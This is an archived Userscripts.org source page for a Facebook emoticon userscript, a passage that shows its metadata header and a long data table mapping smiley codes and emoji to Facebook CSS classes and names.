
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang='en-US' xml:lang='en-US' xmlns='http://www.w3.org/1999/xhtml'>
<head>
<meta content='text/html; charset=utf-8' http-equiv='Content-Type' />
<title>Source for &quot;Cài Đặt ICON TROLL Trực Tiếp Trên FaceBook By Rius D Papicius &quot; - Userscripts.org</title>
<link href='/images/script_icon.png' rel='shortcut icon' type='image/x-icon' />
<link href="/stylesheets/compiled/screen.css?1389736035" media="screen, projection" rel="stylesheet" type="text/css" />
<link href="/stylesheets/compiled/print.css?1389736036" media="print" rel="stylesheet" type="text/css" />
<script src="/javascripts/all.js?1389736029" type="text/javascript"></script>
<link href="/stylesheets/sh_style.css?1389736029" media="screen" rel="stylesheet" type="text/css" />
<script src="/javascripts/sh_main.min.js?1389736029" type="text/javascript"></script>
<script src="/javascripts/sh_javascript.min.js?1389736029" type="text/javascript"></script>

<!--[if IE]>
<link href="/stylesheets/compiled/ie.css?1389736036" media="screen, projection" rel="stylesheet" type="text/css" />
<![endif]-->
</head>
<body class='scripts loggedin wide' id='scripts-review'>
<div id='root'>
<div id='top'>
<div class='container'>
<ul class='login_status'>
<li><a href="/messages" class="mail ">0 Unread Messages</a></li>
<li><a href="/home">HackerTyper</a></li>
<li><a href="/logout">Logout</a></li>
</ul>

</div>
</div>
<div id='header'>
<div class='container'>
<h1><a href="/">Userscripts.org</a></h1>
<ul id='mainmenu'>
<li class='active'><a href="/scripts">Scripts</a></li>
<li><a href="/tags">Tags</a></li>
<li><a href="/forums">Forums</a></li>
<li><a href="/users">People</a></li>
<li><a href="/groups">Groups</a></li>
<li><a href="/guides">Guides</a></li>
</ul>

</div>
</div>
<div id='section'>
<div class='container'>
<div id='heading'>
<a href="/users/578738" id="avatar" rel="nofollow" title="order"><img alt="" class="photo" height="92" src="http://www.gravatar.com/avatar.php?gravatar_id=bbc4dcbe6249f3308c54fcd06f5442f3&amp;r=PG&amp;s=92&amp;default=identicon" width="92" /></a>
<div id='details'>
<h2 class='title'><a href="/scripts/show/391486">Cài Đặt ICON TROLL Trực Tiếp Trên FaceBook by Rius </a></h2>
<span class='author'>By <a href="/users/578738" gravatar="http://www.gravatar.com/avatar.php?gravatar_id=bbc4dcbe6249f3308c54fcd06f5442f3&amp;r=PG&amp;s=80&amp;default=identicon" rel="nofollow" user_id="578738">order</a></span>
&mdash;
<span class='date'>
Last update
1 hour ago
</span>
&mdash;
Installed
0 times.

</div>
</div>
<ul id='script-nav'>

<li class='menu'><a href="/scripts/show/391486">About</a></li>
<li class='menu current'>Source Code</li>
<li class='menu'><a href="/scripts/reviews/391486" rel="nofollow">Reviews <span>0</span></a></li>
<li class='menu'><a href="/scripts/discuss/391486" rel="nofollow">Discussions <span>0</span></a></li>
<li class='menu'><a href="/scripts/fans/391486" rel="nofollow">Fans <span>0</span></a></li>
<li class='menu'><a href="/scripts/issues/391486" rel="nofollow">Issues</a></li>
<li><a href="http://www.addtoany.com/share_save?linkname=C%C3%A0i+%C4%90%E1%BA%B7t+ICON+TROLL+Tr%E1%BB%B1c+Ti%E1%BA%BFp+Tr%C3%AAn+FaceBook+&amp;linkurl=http%3A%2F%2Fuserscripts.org%2Fscripts%2Fshow%2F391486" class="a2a_dd" rel="nofollow">Share</a></li>
</ul>
</div>
</div>

<div class='container'>

<div id='content'>



<p class='notice'>
There are
<a href="/scripts/versions/391486">11 previous versions</a>
of this script.
</p>
<h3><a href="#" onclick="sh_highlightDocument(); this.parentNode.innerHTML=''; return false">Add Syntax Highlighting</a> <em>(this will take a few seconds, probably freezing your browser while it works)</em></h3></h3>
<pre class='sh_javascript' id='source'>// ==UserScript==
// @name            Cài Đặt ICON Trực Tiếp Trên FaceBook
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector(&quot;#pageNav&quot;)) {
		return;
	}
	//console.info(&quot;Extra Facebook Smileys&quot;);

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
&quot;chars&quot; : &quot; :) &quot;,
		&quot;class&quot; : &quot;emoticon_smile&quot;,
		&quot;name&quot; : &quot;Smiley&quot;
	}, {
		&quot;chars&quot; : &quot; :( &quot;,
		&quot;class&quot; : &quot;emoticon_frown&quot;,
		&quot;name&quot; : &quot;Frown&quot;
	}, {
		&quot;chars&quot; : &quot; :P &quot;,
		&quot;class&quot; : &quot;emoticon_tongue&quot;,
		&quot;name&quot; : &quot;Tongue&quot;
	}, {
        &quot;chars&quot; : &quot; :D &quot;,
		&quot;class&quot; : &quot;emoticon_grin&quot;,
		&quot;name&quot; : &quot;Grin&quot;
	}, {
		&quot;chars&quot; : &quot; :o &quot;,
		&quot;class&quot; : &quot;emoticon_gasp&quot;,
		&quot;name&quot; : &quot;Gasp&quot;
	}, {
		&quot;chars&quot; : &quot; ;) &quot;,
		&quot;class&quot; : &quot;emoticon_wink&quot;,
		&quot;name&quot; : &quot;Wink&quot;
	}, {
		&quot;chars&quot; : &quot; :v &quot;,
		&quot;class&quot; : &quot;emoticon_pacman&quot;,
		&quot;name&quot; : &quot;Pacman&quot;
	}, {
		&quot;chars&quot; : &quot; &gt;:( &quot;,
		&quot;class&quot; : &quot;emoticon_grumpy&quot;,
		&quot;name&quot; : &quot;GruÃ±Ã³n&quot;
	}, {
		&quot;chars&quot; : &quot; :/ &quot;,
		&quot;class&quot; : &quot;emoticon_unsure&quot;,
		&quot;name&quot; : &quot;Unsure&quot;
	}, {
		&quot;chars&quot; : &quot; :&#39;( &quot;,
		&quot;class&quot; : &quot;emoticon_cry&quot;,
		&quot;name&quot; : &quot;Cry&quot;
	}, {
		&quot;chars&quot; : &quot; ^_^ &quot;,
		&quot;class&quot; : &quot;emoticon_kiki&quot;,
		&quot;name&quot; : &quot;Kiki&quot;
	}, {
		&quot;chars&quot; : &quot; 8) &quot;,
		&quot;class&quot; : &quot;emoticon_glasses&quot;,
		&quot;name&quot; : &quot;Glasses&quot;
	}, {
		&quot;chars&quot; : &quot; B| &quot;,
		&quot;class&quot; : &quot;emoticon_sunglasses&quot;,
		&quot;name&quot; : &quot;Sunglasses&quot;
	}, {
		&quot;chars&quot; : &quot; &lt;3 &quot;,
		&quot;class&quot; : &quot;emoticon_heart&quot;,
		&quot;name&quot; : &quot;Heart&quot;
	}, {
		&quot;chars&quot; : &quot; 3:) &quot;,
		&quot;class&quot; : &quot;emoticon_devil&quot;,
		&quot;name&quot; : &quot;Devil&quot;
	}, {
		&quot;chars&quot; : &quot; O:) &quot;,
		&quot;class&quot; : &quot;emoticon_angel&quot;,
		&quot;name&quot; : &quot;Angel&quot;
	}, {
		&quot;chars&quot; : &quot; -_- &quot;,
		&quot;class&quot; : &quot;emoticon_squint&quot;,
		&quot;name&quot; : &quot;Squint&quot;
	}, {
		&quot;chars&quot; : &quot; o.O &quot;,
		&quot;class&quot; : &quot;emoticon_confused&quot;,
		&quot;name&quot; : &quot;Confused&quot;
	}, {
		&quot;chars&quot; : &quot; &gt;:o &quot;,
		&quot;class&quot; : &quot;emoticon_upset&quot;,
		&quot;name&quot; : &quot;Upset&quot;
	}, {
		&quot;chars&quot; : &quot; :3 &quot;,
		&quot;class&quot; : &quot;emoticon_colonthree&quot;,
		&quot;name&quot; : &quot;Colonthree&quot;
	}, {
		&quot;chars&quot; : &quot; (y) &quot;,
		&quot;class&quot; : &quot;emoticon_like&quot;,
		&quot;name&quot; : &quot;Like&quot;
	}, {
		&quot;chars&quot; : &quot; :* &quot;,
		&quot;class&quot; : &quot;emoticon emoticon_kiss&quot;,
		&quot;name&quot; : &quot;Kiss&quot;
	}, {
		&quot;chars&quot; : &quot; (^^^) &quot;,
		&quot;class&quot; : &quot;emoticon_shark&quot;,
		&quot;name&quot; : &quot;Shark&quot;
	}, {
		&quot;chars&quot; : &quot; :|] &quot;,
		&quot;class&quot; : &quot;emoticon_robot&quot;,
		&quot;name&quot; : &quot;Robot&quot;
	}, {
		&quot;chars&quot; : &quot; &lt;(\&quot;) &quot;,
		&quot;class&quot; : &quot;emoticon_penguin&quot;,
		&quot;name&quot; : &quot;PingÃ¼ino&quot;
	}, {
		&quot;chars&quot; : &quot; :poop: &quot;,
		&quot;class&quot; : &quot;emoticon_poop&quot;,
		&quot;name&quot; : &quot;Poop&quot;
        }, {
		&quot;chars&quot; : &quot; :putnam: &quot;,
		&quot;class&quot; : &quot;emoticon_putnam&quot;,
		&quot;name&quot; : &quot;Putman&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf02 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c0&quot;,
		&quot;name&quot; : &quot;Pink Umbrella&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf0a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c1&quot;,
		&quot;name&quot; : &quot;Sea Wave&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf19 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c2&quot;,
		&quot;name&quot; : &quot;Crescent moon&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf1f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c3&quot;,
		&quot;name&quot; : &quot;Bright Star&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf31 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c4&quot;,
		&quot;name&quot; : &quot;Seedbed&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf34 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c5&quot;,
		&quot;name&quot; : &quot;Single Palm Tree&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf35 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c6&quot;,
		&quot;name&quot; : &quot;Cactus&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf37 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c7&quot;,
		&quot;name&quot; : &quot;Tulip&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf38 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c8&quot;,
		&quot;name&quot; : &quot;Cherry Blossom&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf39 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c9&quot;,
		&quot;name&quot; : &quot;Rose&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf3a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ca&quot;,
		&quot;name&quot; : &quot;Cayenne&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf3b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cb&quot;,
		&quot;name&quot; : &quot;Sunflower&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf3e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cc&quot;,
		&quot;name&quot; : &quot;Ear Of Rice&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf40 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cd&quot;,
		&quot;name&quot; : &quot;Four Leaf Clover&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf41 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ce&quot;,
		&quot;name&quot; : &quot;Maple Leaf&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf42 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cf&quot;,
		&quot;name&quot; : &quot;Fallen Leaf&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf43 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cg&quot;,
		&quot;name&quot; : &quot;Leaf Floating In The Wind&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf4a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ch&quot;,
		&quot;name&quot; : &quot;Tangerine&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf4e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ci&quot;,
		&quot;name&quot; : &quot;Red Apple&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf53 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cj&quot;,
		&quot;name&quot; : &quot;Strawberry&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf54 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ck&quot;,
		&quot;name&quot; : &quot;Burger&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf78 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cl&quot;,
		&quot;name&quot; : &quot;Cocktail Glass&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf7a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cm&quot;,
		&quot;name&quot; : &quot;Tankard&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf81 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cn&quot;,
		&quot;name&quot; : &quot;Gift Wrapped&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf83 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2co&quot;,
		&quot;name&quot; : &quot;Pumpkin With Candle&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf84 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cp&quot;,
		&quot;name&quot; : &quot;Christmas Tree&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf85 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cq&quot;,
		&quot;name&quot; : &quot;Santa&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf88 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cr&quot;,
		&quot;name&quot; : &quot;Balloon&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf89 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cs&quot;,
		&quot;name&quot; : &quot;Party Popper&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf8d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ct&quot;,
		&quot;name&quot; : &quot;Pine Decor&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf8e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cu&quot;,
		&quot;name&quot; : &quot;Japanese Dolls&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf8f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cv&quot;,
		&quot;name&quot; : &quot;Carp Streamer&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf90 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cw&quot;,
		&quot;name&quot; : &quot;Wind Chime&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udf93 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cx&quot;,
		&quot;name&quot; : &quot;Graduation Cap&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udfb5 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cy&quot;,
		&quot;name&quot; : &quot;Musical Note&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udfb6 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2cz&quot;,
		&quot;name&quot; : &quot;Multiple Musical Notes&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83c\udfbc &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c-&quot;,
		&quot;name&quot; : &quot;Musical Score&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc0d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2c_&quot;,
		&quot;name&quot; : &quot;Snake&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc0e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d0&quot;,
		&quot;name&quot; : &quot;Horse&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc11 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d1&quot;,
		&quot;name&quot; : &quot;Sheep&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc12 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d2&quot;,
		&quot;name&quot; : &quot;Monkey&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc14 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d3&quot;,
		&quot;name&quot; : &quot;Hen&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc17 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d4&quot;,
		&quot;name&quot; : &quot;Wild Boar&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc18 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d5&quot;,
		&quot;name&quot; : &quot;Elephant&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc19 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d6&quot;,
		&quot;name&quot; : &quot;Octopus&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc1a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d7&quot;,
		&quot;name&quot; : &quot;Snail Shell&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc1b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d8&quot;,
		&quot;name&quot; : &quot;Insect&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc1f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d9&quot;,
		&quot;name&quot; : &quot;Fish&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc20 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2da&quot;,
		&quot;name&quot; : &quot;Tropical Fish&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc21 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2db&quot;,
		&quot;name&quot; : &quot;Pufferfish&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc25 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dc&quot;,
		&quot;name&quot; : &quot;Chick In Front&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc26 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dd&quot;,
		&quot;name&quot; : &quot;Bird&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc27 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2de&quot;,
		&quot;name&quot; : &quot;Penguin&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc28 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2df&quot;,
		&quot;name&quot; : &quot;Koala&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc29 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dg&quot;,
		&quot;name&quot; : &quot;Poodle&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc2b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dh&quot;,
		&quot;name&quot; : &quot;Bactrian Camel&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc2c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2di&quot;,
		&quot;name&quot; : &quot;Dolphin&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc2d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dj&quot;,
		&quot;name&quot; : &quot;Mouse Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc2e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dk&quot;,
		&quot;name&quot; : &quot;Cow Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc2f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dl&quot;,
		&quot;name&quot; : &quot;Cara de tigre&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc30 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dm&quot;,
		&quot;name&quot; : &quot;Rabbit Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc31 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dn&quot;,
		&quot;name&quot; : &quot;Cat Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc33 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2do&quot;,
		&quot;name&quot; : &quot;Whale Sputtering&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc34 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dp&quot;,
		&quot;name&quot; : &quot;Horse Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc35 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dq&quot;,
		&quot;name&quot; : &quot;Monkey Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc37 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dr&quot;,
		&quot;name&quot; : &quot;Pig face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc38 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ds&quot;,
		&quot;name&quot; : &quot;Frog Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc39 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dt&quot;,
		&quot;name&quot; : &quot;Hamster Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc3a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2du&quot;,
		&quot;name&quot; : &quot;Wolf Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc3b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dv&quot;,
		&quot;name&quot; : &quot;Bear Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc3e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dw&quot;,
		&quot;name&quot; : &quot;Footprints&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc40 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dx&quot;,
		&quot;name&quot; : &quot;Eyes&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc42 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dy&quot;,
		&quot;name&quot; : &quot;Ear&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc43 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2dz&quot;,
		&quot;name&quot; : &quot;Nose&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc44 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d-&quot;,
		&quot;name&quot; : &quot;Mouth&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc45 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2d_&quot;,
		&quot;name&quot; : &quot;Sour Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc46 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e0&quot;,
		&quot;name&quot; : &quot;White hand pointing up&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc47 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e1&quot;,
		&quot;name&quot; : &quot;White hand faces downward&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc48 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e2&quot;,
		&quot;name&quot; : &quot;White hand indicating left&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc49 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e3&quot;,
		&quot;name&quot; : &quot;White hand indicating right&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc4a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e4&quot;,
		&quot;name&quot; : &quot;Fist&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc4b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e5&quot;,
		&quot;name&quot; : &quot;Hand in motion&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc4c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e6&quot;,
		&quot;name&quot; : &quot;Hand showing all good&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc4d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e7&quot;,
		&quot;name&quot; : &quot;Hand with thumb up&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc4e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e8&quot;,
		&quot;name&quot; : &quot;Hand with thumb down&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc4f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e9&quot;,
		&quot;name&quot; : &quot;Hands clapping&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc50 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ea&quot;,
		&quot;name&quot; : &quot;Open Hands&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc66 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2eb&quot;,
		&quot;name&quot; : &quot;Boy&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc67 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ec&quot;,
		&quot;name&quot; : &quot;Girl&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc68 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ed&quot;,
		&quot;name&quot; : &quot;Man&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc69 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ee&quot;,
		&quot;name&quot; : &quot;Woman&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc6b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ef&quot;,
		&quot;name&quot; : &quot;Man and woman holding hands&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc6e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2eg&quot;,
		&quot;name&quot; : &quot;Police Officer&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc6f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2eh&quot;,
		&quot;name&quot; : &quot;Woman with bunny ears&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc71 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ei&quot;,
		&quot;name&quot; : &quot;Person with hair rubio&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc72 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ej&quot;,
		&quot;name&quot; : &quot;Man with pi mao gua&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc73 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ek&quot;,
		&quot;name&quot; : &quot;Man with turban&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc74 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2el&quot;,
		&quot;name&quot; : &quot;Old Man&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc75 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2em&quot;,
		&quot;name&quot; : &quot;Old Woman&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc76 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2en&quot;,
		&quot;name&quot; : &quot;Baby&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc77 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2eo&quot;,
		&quot;name&quot; : &quot;Construction Worker&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc78 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ep&quot;,
		&quot;name&quot; : &quot;Princess&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc7b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2eq&quot;,
		&quot;name&quot; : &quot;Ghost&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc7c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2er&quot;,
		&quot;name&quot; : &quot;Angel baby&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc7d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2es&quot;,
		&quot;name&quot; : &quot;Alien&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc7e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2et&quot;,
		&quot;name&quot; : &quot;Alien Monster&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc7f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2eu&quot;,
		&quot;name&quot; : &quot;Imp&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc80 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ev&quot;,
		&quot;name&quot; : &quot;Skull&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc82 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ew&quot;,
		&quot;name&quot; : &quot;Guard&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc83 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ex&quot;,
		&quot;name&quot; : &quot;Ballerina&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc85 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ey&quot;,
		&quot;name&quot; : &quot;Nail Polish&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc8b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ez&quot;,
		&quot;name&quot; : &quot;Brand of kiss&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc8f &quot;,
